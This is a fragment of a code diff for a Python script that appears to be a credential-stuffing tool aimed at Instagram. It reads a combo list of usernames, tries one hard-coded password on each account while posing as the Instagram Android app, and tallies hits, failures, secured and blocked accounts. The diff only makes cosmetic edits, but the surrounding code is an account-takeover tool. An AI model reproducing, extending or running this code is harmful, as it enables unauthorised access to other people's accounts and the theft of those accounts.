@@ -234,9 +234,6 @@ elif ask =="1":
         else:
             b+=1    
             print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
-
-   
-        pass
     else:
         assk  = assk + '.txt'
     clear()
@@ -247,7 +244,7 @@ elif ask =="1":
     acc = open(assk,"r").read().splitlines()
     for combo in acc:
         user = combo.split(":")[0]
-        pasw = '1122aass'
+        pasw = "1122aass"
         req = requests.session()
         log_head = {
         'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
@@ -292,5 +289,3 @@ elif ask =="1":
         else:
             b+=1    
             print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
-
-    
